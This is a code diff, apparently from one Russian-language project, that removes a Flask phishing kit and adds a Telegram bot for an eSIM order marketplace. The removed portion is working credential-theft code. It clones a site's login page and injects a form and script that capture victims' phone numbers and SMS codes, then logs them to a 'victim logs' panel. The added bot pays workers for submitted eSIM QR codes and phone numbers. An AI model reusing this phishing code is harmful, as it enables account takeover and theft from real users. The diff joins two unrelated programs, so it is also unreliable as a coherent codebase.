+    c.execute('INSERT OR IGNORE INTO channels (channel_id, username) VALUES (?, ?)',
+              (channel_id, username))
+    conn.commit()
+    conn.close()
+
+    await message.answer(f"✅ Канал {username or channel_id} добавлен!")
+    await state.clear()
+
+# ============ АДМИН: ГРУППЫ ============
+@dp.callback_query(F.data == "admin_groups")
+async def admin_groups(callback: CallbackQuery):
+    if not is_admin(callback.from_user.id): return
+    conn = get_db()
+    c = conn.cursor()
+    c.execute('SELECT * FROM groups')
+    groups = c.fetchall()
+    conn.close()
+
+    text = "<b>👥 НАСТРОЙКА ГРУПП</b>\n\n"
+    for g in groups:
+        status = "🟢 Активна" if g['active'] else "🔴 Неактивна"
+        text += f"• {g['username'] or g['group_id']} — {status}\n"
+
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="➕ Добавить группу", callback_data="admin_add_group")],
+        [InlineKeyboardButton(text="🔙 Назад", callback_data="admin_back")],
+    ])
+    await callback.message.edit_text(text, reply_markup=kb)
+    await callback.answer()
+
+@dp.callback_query(F.data == "admin_add_group")
+async def admin_add_group(callback: CallbackQuery, state: FSMContext):
+    if not is_admin(callback.from_user.id): return
+    await callback.message.edit_text("Добавьте бота в группу и введите её @username или ID.")
+    await state.set_state(AdminStates.waiting_for_group)
+    await callback.answer()
+
+@dp.message(AdminStates.waiting_for_group)
+async def group_received(message: Message, state: FSMContext):
+    if not is_admin(message.from_user.id): return
+    group_id = None
+    username = None
+    if message.text:
+        username = message.text.strip()
+        try:
+            chat = await bot.get_chat(username)
+            group_id = str(chat.id)
+        except:
+            await message.answer("Не удалось найти группу")
+            return
+
+    conn = get_db()
+    c = conn.cursor()
+    c.execute('INSERT OR IGNORE INTO groups (group_id, username) VALUES (?, ?)', (group_id, username))
+    conn.commit()
+    conn.close()
+
+    await message.answer(f"✅ Группа добавлена! В группе напишите /work для активации.")
+    await state.clear()
+
+# ============ АДМИН: ОПЕРАТОРЫ ============
+@dp.callback_query(F.data == "admin_operators")
+async def admin_operators(callback: CallbackQuery):
+    if not is_admin(callback.from_user.id): return
+    ops = get_operators()
+    text = "<b>💰 ОПЕРАТОРЫ И ЦЕНЫ</b>\n\n"
+    for op in ops:
+        text += f"{op['emoji']} {op['name']} — {op['price']}$\n"
+
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="➕ Добавить оператора", callback_data="admin_add_op")],
+        [InlineKeyboardButton(text="✏️ Изменить цену", callback_data="admin_edit_op")],
+        [InlineKeyboardButton(text="🗑️ Удалить оператора", callback_data="admin_del_op")],
+        [InlineKeyboardButton(text="🔙 Назад", callback_data="admin_back")],
+    ])
+    await callback.message.edit_text(text, reply_markup=kb)
+    await callback.answer()
+
+@dp.callback_query(F.data == "admin_add_op")
+async def admin_add_op(callback: CallbackQuery, state: FSMContext):
+    if not is_admin(callback.from_user.id): return
+    await callback.message.edit_text("Введите название оператора:", reply_markup=back_to_admin())
+    await state.set_state(AdminStates.waiting_for_operator_name)
+    await callback.answer()
+
+@dp.message(AdminStates.waiting_for_operator_name)
+async def op_name_received(message: Message, state: FSMContext):
+    await state.update_data(op_name=message.text)
+    await message.answer("Введите цену ($):")
+    await state.set_state(AdminStates.waiting_for_operator_price)
+
+@dp.message(AdminStates.waiting_for_operator_price)
+async def op_price_received(message: Message, state: FSMContext):
+    try:
+        price = float(message.text)
+    except:
+        await message.answer("Введите число!")
+        return
+    await state.update_data(op_price=price)
+    await message.answer("Отправьте эмодзи для оператора:")
+    await state.set_state(AdminStates.waiting_for_operator_emoji)
+
+@dp.message(AdminStates.waiting_for_operator_emoji)
+async def op_emoji_received(message: Message, state: FSMContext):
+    data = await state.get_data()
+    emoji = message.text.strip()[0] if message.text else '📱'
+    conn = get_db()
+    c = conn.cursor()
+    c.execute('INSERT OR REPLACE INTO operators (name, price, emoji) VALUES (?, ?, ?)',
+              (data['op_name'], data['op_price'], emoji))
+    conn.commit()
+    conn.close()
+    await message.answer(f"✅ Оператор {emoji} {data['op_name']} · {data['op_price']}$ добавлен!")
+    await state.clear()
+
+# ============ АДМИН: БД ============
+@dp.callback_query(F.data == "admin_db_export")
+async def admin_db_export(callback: CallbackQuery):
+    if not is_admin(callback.from_user.id): return
+    try:
+        await callback.message.answer_document(
+            FSInputFile(DB_PATH),
+            caption=f"📦 БД от {datetime.now().strftime('%Y-%m-%d %H:%M')}"
+        )
+        await callback.answer("✅ Выгружено!")
+    except Exception as e:
+        await callback.answer(f"Ошибка: {e}")
+
+@dp.callback_query(F.data == "admin_db_import")
+async def admin_db_import(callback: CallbackQuery, state: FSMContext):
+    if not is_admin(callback.from_user.id): return
+    await callback.message.edit_text("Отправьте файл .db для замены базы данных.")
+    await state.set_state(AdminStates.waiting_for_db_file)
+    await callback.answer()
+
+@dp.message(AdminStates.waiting_for_db_file, F.document)
+async def db_file_received(message: Message, state: FSMContext):
+    if not is_admin(message.from_user.id): return
+    doc = message.document
+    if not doc.file_name.endswith('.db'):
+        await message.answer("❌ Нужен .db файл!")
+        return
+    try:
+        await bot.download(doc, destination=DB_PATH)
+        init_db()
+        await message.answer("✅ База данных заменена и перезагружена!")
+    except Exception as e:
+        await message.answer(f"❌ Ошибка: {e}")
+    await state.clear()
+
+@dp.callback_query(F.data == "admin_db_auto")
+async def admin_db_auto(callback: CallbackQuery):
+    if not is_admin(callback.from_user.id): return
+    current = get_setting('auto_backup')
+    new = 'off' if current == 'on' else 'on'
+    set_setting('auto_backup', new)
+    await callback.answer(f"Автовыгрузка: {new.upper()}")
+    await callback.message.edit_reply_markup(reply_markup=admin_menu())
+
+# ============ АДМИН: СОЗДАТЬ ЗАЯВКУ ВРУЧНУЮ ============
+@dp.callback_query(F.data == "admin_create_order")
+async def admin_create_order(callback: CallbackQuery):
+    if not is_admin(callback.from_user.id): return
+    await callback.message.edit_text("<b>📱 ВЫБЕРИТЕ ОПЕРАТОРА</b>", reply_markup=operators_keyboard())
+    await callback.answer()
+
+@dp.callback_query(F.data.startswith("order_op_"))
+async def admin_order_created(callback: CallbackQuery):
+    if not is_admin(callback.from_user.id): return
+    op_id = int(callback.data.split("_")[2])
+    conn = get_db()
+    c = conn.cursor()
+    c.execute('SELECT * FROM operators WHERE id = ?', (op_id,))
+    op = c.fetchone()
+
+    channels = get_active_channels()
+    if not channels:
+        await callback.answer("Нет каналов для заявок")
+        conn.close()
+        return
+
+    c.execute('INSERT INTO orders (operator, price, mode, status) VALUES (?, ?, ?, ?)',
+              (op['name'], op['price'], get_setting('default_mode'), 'active'))
+    order_id = c.lastrowid
+    conn.commit()
+    conn.close()
+
+    channel_id = channels[0]['channel_id']
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🔥 ЗАБРАТЬ ЗАКАЗ", callback_data=f"take_order_{order_id}")]
+    ])
+
+    msg_text = (
+        f"<b>🔔 НОВЫЙ ЗАКАЗ #{order_id}</b>\n\n"
+        f"📱 <b>Оператор:</b> {op['emoji']} {op['name']}\n"
+        f"💰 <b>Цена:</b> {op['price']}$\n"
+        f"🎯 <b>Режим:</b> {get_setting('default_mode')}\n"
+        f"⏳ <b>Дедлайн:</b> 10 минут\n\n"
+        f"<i>Кто первый нажмёт — тому заказ</i>"
+    )
 
     try:
-        # Рендерим страницу через Playwright
-        html, screenshot = render_page(url)
-        soup = BeautifulSoup(html, 'html.parser')
-
-        # Сохраняем скриншот для предпросмотра
-        with open(out + '/preview.png', 'wb') as f: f.write(screenshot)
-
-        # Загружаем статические ресурсы
-        sess = requests.Session()
-        sess.headers.update({'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)'})
-        assets = download_assets(sess, soup, url, out)
-
-        # Находим форму входа (предполагаем, что она есть)
-        # Можно искать по ключевым атрибутам: input type="tel", placeholder с номером телефона и т.д.
-        phone_input = soup.find('input', {'type': 'tel'}) or soup.find('input', {'placeholder': re.compile(r'телефон|phone', re.I)})
-        if phone_input:
-            form = phone_input.find_parent('form')
-        else:
-            form = soup.find('form')
-
-        if form:
-            # Очищаем форму и добавляем свои поля
-            form.clear()
-            form['action'] = '/submit/' + pid
-            form['method'] = 'POST'
-            form['id'] = 'phishForm'
-
-            # Пытаемся сохранить оригинальные стили формы, добавив свой ввод
-            div_phone = soup.new_tag('div')
-            div_phone['class'] = form.get('class', '')
-            label_phone = soup.new_tag('label')
-            label_phone.string = 'Номер телефона'
-            div_phone.append(label_phone)
-            phone_inp = soup.new_tag('input')
-            phone_inp['type'] = 'tel'
-            phone_inp['name'] = 'phone'
-            phone_inp['placeholder'] = '+7 999 123-45-67'
-            phone_inp['required'] = ''
-            phone_inp['style'] = 'width:100%;padding:14px;border-radius:12px;border:1px solid #ccc;font-size:16px;margin-bottom:10px'
-            div_phone.append(phone_inp)
-
-            div_code = soup.new_tag('div')
-            div_code['id'] = 'codeDiv'
-            div_code['style'] = 'display:none'
-            label_code = soup.new_tag('label')
-            label_code.string = 'Код из SMS'
-            div_code.append(label_code)
-            code_inp = soup.new_tag('input')
-            code_inp['type'] = 'text'
-            code_inp['name'] = 'code'
-            code_inp['placeholder'] = 'Введите код'
-            code_inp['maxlength'] = '6'
-            code_inp['style'] = 'width:100%;padding:14px;border-radius:12px;border:1px solid #ccc;font-size:16px;margin-bottom:10px'
-            div_code.append(code_inp)
-
-            btn = soup.new_tag('button')
-            btn['type'] = 'submit'
-            btn['id'] = 'phishBtn'
-            btn['style'] = 'width:100%;padding:15px;background:#007aff;color:#fff;border:none;border-radius:12px;font-size:17px;font-weight:600;cursor:pointer'
-            btn.string = 'Продолжить'
-
-            form.append(div_phone)
-            form.append(div_code)
-            form.append(btn)
-
-            # Добавляем скрипт перехвата
-            script = soup.new_tag('script')
-            script.string = '''
-var step=1;
-var phishId=''' + pid + '''';
-var redirectUrl=''' + json.dumps(url) + ''';
-document.getElementById('phishForm').addEventListener('submit',function(e){
-    e.preventDefault();
-    var phone=this.querySelector('[name="phone"]').value.replace(/[^0-9]/g,'');
-    if(step===1){
-        if(phone.length<10){alert('Введите полный номер');return;}
-        fetch('/submit/'+phishId,{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'phone='+phone+'&step=1'});
-        document.getElementById('codeDiv').style.display='block';
-        document.getElementById('phishBtn').textContent='Подтвердить';
-        this.querySelector('[name="code"]').focus();
-        step=2;
-    }else{
-        var code=this.querySelector('[name="code"]').value.trim();
-        if(code.length<4){alert('Введите код');return;}
-        fetch('/submit/'+phishId,{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'phone='+phone+'&code='+code+'&step=2'});
-        document.getElementById('phishBtn').textContent='Проверка...';
-        document.getElementById('phishBtn').disabled=true;
-        setTimeout(function(){window.location.href=redirectUrl},3000);
-    }
-});
-'''
-            soup.find('body').append(script) if soup.find('body') else soup.append(script)
-            forms = 1
-        else:
-            # Если форма не найдена - создать свою
-            wrapper = soup.new_tag('div')
-            wrapper['style'] = 'max-width:350px;margin:50px auto;padding:30px;background:#fff;border-radius:16px;box-shadow:0 2px 20px rgba(0,0,0,0.1);text-align:center'
-            wrapper.append(BeautifulSoup('<h2>Вход</h2><p>Введите номер телефона</p>', 'html.parser'))
-            f = soup.new_tag('form')
-            f['action'] = '/submit/' + pid
-            f['method'] = 'POST'
-            f['id'] = 'phishForm'
-            f.append(BeautifulSoup('<label>Номер телефона</label><input type="tel" name="phone" placeholder="+7 999 123-45-67" required style="width:100%;padding:14px;border-radius:12px;border:1px solid #ddd;font-size:16px;margin-bottom:10px"><div id="codeDiv" style="display:none"><label>Код из SMS</label><input type="text" name="code" placeholder="Введите код" maxlength="6" style="width:100%;padding:14px;border-radius:12px;border:1px solid #ddd;font-size:16px;margin-bottom:10px"></div><button type="submit" id="phishBtn" style="width:100%;padding:15px;background:#007aff;color:#fff;border:none;border-radius:12px;font-size:17px;font-weight:600;cursor:pointer">Продолжить</button>', 'html.parser'))
-            wrapper.append(f)
-            script = soup.new_tag('script')
-            script.string = '''
-var step=1;
-var phishId=''' + pid + '''';
-var redirectUrl=''' + json.dumps(url) + ''';
-document.getElementById('phishForm').addEventListener('submit',function(e){
-    e.preventDefault();
-    var phone=this.querySelector('[name="phone"]').value.replace(/[^0-9]/g,'');
-    if(step===1){
-        if(phone.length<10){alert('Введите полный номер');return;}
-        fetch('/submit/'+phishId,{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'phone='+phone+'&step=1'});
-        document.getElementById('codeDiv').style.display='block';
-        document.getElementById('phishBtn').textContent='Подтвердить';
-        this.querySelector('[name="code"]').focus();
-        step=2;
-    }else{
-        var code=this.querySelector('[name="code"]').value.trim();
-        if(code.length<4){alert('Введите код');return;}
-        fetch('/submit/'+phishId,{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'phone='+phone+'&code='+code+'&step=2'});
-        document.getElementById('phishBtn').textContent='Проверка...';
-        document.getElementById('phishBtn').disabled=true;
-        setTimeout(function(){window.location.href=redirectUrl},3000);
-    }
-});
-'''
-            wrapper.append(script)
-            if soup.find('body'):
-                soup.find('body').clear()
-                soup.find('body').append(wrapper)
-            else:
-                soup.clear()
-                soup.append(wrapper)
-            forms = 1
-
-        html_out = '<!DOCTYPE html>\n<html>\n<head>\n<meta charset="UTF-8">\n'
-        html_out += '<meta name="viewport" content="width=device-width, initial-scale=1.0">\n'
-        html_out += '<base href="/p/' + pid + '/">\n'
-        head = soup.find('head')
-        if head:
-            for tag in head.find_all(True):
-                if tag.name in ['meta', 'title', 'link', 'style', 'script']:
-                    html_out += str(tag) + '\n'
-        html_out += '</head>\n' + (str(soup.find('body')) if soup.find('body') else str(soup)) + '\n</html>'
-
-        with open(out + '/index.html', 'w', encoding='utf-8') as f: f.write(html_out)
-
-        PROJECTS[pid] = {'url': url, 'domain': urlparse(url).netloc, 'dir': out, 'assets': assets, 'forms': forms, 'logs': [], 'type': 'phish'}
-        host = request.host_url.rstrip('/')
-        return jsonify({
-            'id': pid, 'url': host + '/p/' + pid, 'download': host + '/api/download/' + pid,
-            'panel': host + '/panel/' + pid, 'assets': assets, 'forms': forms
-        })
+        sent = await bot.send_message(chat_id=channel_id, text=msg_text, reply_markup=kb)
+        conn = get_db()
+        c = conn.cursor()
+        c.execute('UPDATE orders SET channel_msg_id = ? WHERE id = ?', (sent.message_id, order_id))
+        conn.commit()
+        conn.close()
+        await callback.answer("✅ Заявка создана!")
+        await callback.message.edit_text(f"✅ Заявка #{order_id} отправлена в канал.")
     except Exception as e:
-        return jsonify({'error': str(e)[:200]}), 500
+        await callback.answer(f"Ошибка: {e}")
 
-# Остальные маршруты остаются без изменений
-@app.route('/p/<pid>')
-def serve_page(pid):
-    path = '/tmp/' + pid + '/index.html'
-    if os.path.exists(path): return open(path, encoding='utf-8').read()
-    return 'Not found', 404
+# ============ ОБРАБОТЧИКИ НАВИГАЦИИ ============
+@dp.callback_query(F.data == "back_main")
+async def back_main(callback: CallbackQuery):
+    if callback.message.chat.type == ChatType.PRIVATE:
+        await callback.message.edit_text(
+            "<b>🚀 ERWINS ESIM BOT</b>\n\nВыберите действие:",
+            reply_markup=main_menu()
+        )
+    await callback.answer()
 
-@app.route('/p/<pid>/<path:filename>')
-def serve_assets(pid, filename):
-    path = '/tmp/' + pid + '/' + filename
-    if os.path.exists(path):
-        ct = 'text/css' if filename.endswith('.css') else 'application/javascript' if filename.endswith('.js') else 'image/png' if filename.endswith('.png') else 'image/jpeg'
-        return open(path, 'rb').read(), 200, {'Content-Type': ct}
-    return 'Not found', 404
+@dp.callback_query(F.data == "admin_back")
+async def admin_back(callback: CallbackQuery):
+    if not is_admin(callback.from_user.id): return
+    await callback.message.edit_text("<b>🛠️ АДМИН-ПАНЕЛЬ</b>", reply_markup=admin_menu())
+    await callback.answer()
 
-@app.route('/submit/<pid>', methods=['POST'])
-def submit_data(pid):
-    data = dict(request.form)
-    data['ip'] = request.remote_addr
-    data['time'] = time.strftime('%Y-%m-%d %H:%M:%S')
-    if pid in PROJECTS: PROJECTS[pid].setdefault('logs', []).append(data)
-    with open('/tmp/' + pid + '/logs.json', 'a') as f: f.write(json.dumps(data) + '\n')
-    return jsonify({'status': 'ok'})
+@dp.callback_query(F.data == "close")
+async def close(callback: CallbackQuery):
+    try:
+        await callback.message.delete()
+    except:
+        pass
+    await callback.answer()
 
-@app.route('/panel/<pid>')
-def panel(pid):
-    logs = PROJECTS.get(pid, {}).get('logs', [])
-    log_html = ''
-    for l in logs[-30:]:
-        log_html += '<div style="background:#111;padding:10px;margin:5px 0;border-radius:8px;font-size:13px;font-family:monospace">'
-        for k, v in l.items():
-            log_html += '<span style="color:#ff0">' + k + ':</span> <span style="color:#0ff">' + str(v) + '</span><br>'
-        log_html += '</div>'
-    return '''<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Логи</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<style>*{margin:0;padding:0}body{background:#0a0a0f;color:#0f0;font-family:monospace;padding:20px}h1{font-size:18px;margin-bottom:10px}.count{color:#f00;font-size:28px;margin-bottom:15px}.empty{color:#666;text-align:center;margin-top:50px}</style>
-<script>setInterval(function(){location.reload()},5000)</script></head>
-<body><h1>ЛОГИ ЖЕРТВ</h1><div class="count">Всего: ''' + str(len(logs)) + '''</div>''' + (log_html or '<div class="empty">Ожидание...</div>') + '''</body></html>'''
+@dp.callback_query(F.data == "profile")
+async def profile(callback: CallbackQuery):
+    user = get_user(callback.from_user.id)
+    if not user:
+        ensure_user(callback.from_user.id, callback.from_user.username, callback.from_user.first_name)
+        user = get_user(callback.from_user.id)
 
-@app.route('/api/download/<pid>')
-def api_download(pid):
-    if pid not in PROJECTS: return 'Not found', 404
-    zip_path = '/tmp/' + pid + '.zip'
-    shutil.make_archive('/tmp/' + pid, 'zip', PROJECTS[pid]['dir'])
-    return send_file(zip_path, as_attachment=True, download_name=pid + '.zip')
+    text = (
+        f"<b>👤 ПРОФИЛЬ</b>\n\n"
+        f"🆔 @{user['username'] or user['user_id']}\n"
+        f"📊 <b>Ранг:</b> {user['rank']}\n"
+        f"💎 <b>Бонус:</b> +{user['bonus']}$ к каждому QR\n"
+        f"📱 <b>Зачтено QR за месяц:</b> {user['qr_month']}\n"
+        f"📈 <b>Всего QR:</b> {user['total_qr']}\n"
+        f"💵 <b>Баланс:</b> {user['balance']}$"
+    )
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🔙 Назад", callback_data="back_main")]
+    ])
+    await callback.message.edit_text(text, reply_markup=kb)
+    await callback.answer()
 
-if __name__ == '__main__':
-    os.makedirs('/tmp', exist_ok=True)
-    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
+@dp.callback_query(F.data == "operators_list")
+async def operators_list(callback: CallbackQuery):
+    ops = get_operators()
+    text = "<b>📊 ОПЕРАТОРЫ И ЦЕНЫ</b>\n\n"
+    for op in ops:
+        text += f"{op['emoji']} <b>{op['name']}</b> · {op['price']}$\n"
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🔙 Назад", callback_data="back_main")]
+    ])
+    await callback.message.edit_text(text, reply_markup=kb)
+    await callback.answer()
+
+@dp.callback_query(F.data == "my_numbers")
+async def my_numbers(callback: CallbackQuery):
+    conn = get_db()
+    c = conn.cursor()
+    c.execute('SELECT * FROM orders WHERE executor_id = ? ORDER BY created DESC LIMIT 20',
+              (callback.from_user.id,))
+    orders = c.fetchall()
+    conn.close()
+
+    if not orders:
+        text = "<b>📋 МОИ НОМЕРА</b>\n\n<i>Нет сданных номеров</i>"
+    else:
+        text = "<b>📋 МОИ НОМЕРА</b>\n\n"
+        for o in orders:
+            status_map = {'active': '🟡', 'taken': '🔵', 'done': '🟢'}
+            s = status_map.get(o['status'], '⚪')
+            phone = o['phone'] or '—'
+            text += f"{s} #{o['id']} {o['operator']} · {phone}\n"
+
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🔙 Назад", callback_data="back_main")]
+    ])
+    await callback.message.edit_text(text, reply_markup=kb)
+    await callback.answer()
+
+@dp.callback_query(F.data == "admin_stats")
+async def admin_stats(callback: CallbackQuery):
+    if not is_admin(callback.from_user.id): return
+    conn = get_db()
+    c = conn.cursor()
+    c.execute('SELECT COUNT(*) FROM users')
+    users_count = c.fetchone()[0]
+    c.execute('SELECT COUNT(*) FROM orders')
+    orders_count = c.fetchone()[0]
+    c.execute('SELECT COUNT(*) FROM orders WHERE status = "done"')
+    done_count = c.fetchone()[0]
+    c.execute('SELECT SUM(price) FROM orders WHERE status = "done"')
+    total_sum = c.fetchone()[0] or 0
+    conn.close()
+
+    text = (
+        f"<b>📊 СТАТИСТИКА</b>\n\n"
+        f"👥 <b>Исполнителей:</b> {users_count}\n"
+        f"📱 <b>Заявок всего:</b> {orders_count}\n"
+        f"✅ <b>Выполнено:</b> {done_count}\n"
+        f"💵 <b>Общая сумма:</b> {total_sum}$"
+    )
+    await callback.message.edit_text(text, reply_markup=back_to_admin())
+    await callback.answer()
+
+# ============ ДОПОЛНИТЕЛЬНЫЕ ХЕНДЛЕРЫ ============
+@dp.callback_query(F.data == "referral")
+async def referral(callback: CallbackQuery):
+    ensure_user(callback.from_user.id, callback.from_user.username, callback.from_user.first_name)
+    link = f"https://t.me/{(await bot.me()).username}?start={callback.from_user.id}"
+    user = get_user(callback.from_user.id)
+    text = (
+        f"<b>👥 РЕФЕРАЛЬНАЯ СИСТЕМА</b>\n\n"
+        f"Ваша ссылка:\n<code>{link}</code>\n\n"
+        f"📊 <b>Ранг:</b> {user['rank']}\n"
+        f"💎 <b>Бонус:</b> +{user['bonus']}$ к каждому QR\n"
+        f"📱 <b>QR за месяц:</b> {user['qr_month']}"
+    )
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🔙 Назад", callback_data="back_main")]
+    ])
+    await callback.message.edit_text(text, reply_markup=kb)
+    await callback.answer()
+
+@dp.callback_query(F.data == "help")
+async def help_cmd(callback: CallbackQuery):
+    text = (
+        "<b>ℹ️ ПОМОЩЬ</b>\n\n"
+        "<b>Как сдать ESIM:</b>\n"
+        "1. Нажмите «Сдать ESIM»\n"
+        "2. Отправьте фото QR-кода\n"
+        "3. Укажите номер телефона\n\n"
+        "<b>Как взять заказ:</b>\n"
+        "• В группе: /esim → выбрать оператора\n"
+        "• В канале: нажать «Забрать заказ»\n\n"
+        "<b>Команды группы:</b>\n"
+        "/work — вкл/выкл бота\n"
+        "/esim — запросить номер"
+    )
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🔙 Назад", callback_data="back_main")]
+    ])
+    await callback.message.edit_text(text, reply_markup=kb)
+    await callback.answer()
+
+# ============ АДМИН: РАССЫЛКА ============
+@dp.callback_query(F.data == "admin_broadcast")
+async def admin_broadcast(callback: CallbackQuery, state: FSMContext):
+    if not is_admin(callback.from_user.id): return
+    await callback.message.edit_text("Введите сообщение для рассылки:")
+    await state.set_state(AdminStates.waiting_for_broadcast)
+    await callback.answer()
+
+@dp.message(AdminStates.waiting_for_broadcast)
+async def broadcast_send(message: Message, state: FSMContext):
+    if not is_admin(message.from_user.id): return
+    conn = get_db()
+    c = conn.cursor()
+    c.execute('SELECT user_id FROM users')
+    users = c.fetchall()
+    conn.close()
+
+    count = 0
+    for u in users:
+        try:
+            await bot.send_message(u['user_id'], message.text)
+            count += 1
+        except:
+            pass
+
+    await message.answer(f"✅ Рассылка отправлена: {count}/{len(users)}")
+    await state.clear()
+
+# ============ АДМИН: КНОПКИ ============
+@dp.callback_query(F.data == "admin_buttons")
+async def admin_buttons(callback: CallbackQuery):
+    if not is_admin(callback.from_user.id): return
+    conn = get_db()
+    c = conn.cursor()
+    c.execute('SELECT * FROM button_config')
+    rows = c.fetchall()
+    conn.close()
+
+    text = "<b>📝 НАСТРОЙКА КНОПОК</b>\n\n"
+    for b in rows:
+        text += f"{b['emoji']} {b['text']} · {b['button_name']}\n"
+
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="➕ Добавить кнопку", callback_data="admin_add_button")],
+        [InlineKeyboardButton(text="🔙 Назад", callback_data="admin_back")],
+    ])
+    await callback.message.edit_text(text, reply_markup=kb)
+    await callback.answer()
+
+# ============ АВТОБЭКАП ============
+async def auto_backup_task():
+    while True:
+        await asyncio.sleep(3600)  # раз в час
+        if get_setting('auto_backup') == 'on':
+            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+            backup_path = os.path.join(BACKUP_DIR, f'backup_{timestamp}.db')
+            import shutil
+            shutil.copy2(DB_PATH, backup_path)
+            logger.info(f"Автобэкап сохранён: {backup_path}")
+
+# ============ ЗАПУСК ============
+async def main():
+    dp.startup.register(lambda: logger.info("Бот запущен"))
+    asyncio.create_task(auto_backup_task())
+    await dp.start_polling(bot)
+
+if __name__ == "__main__":
+    asyncio.run(main())
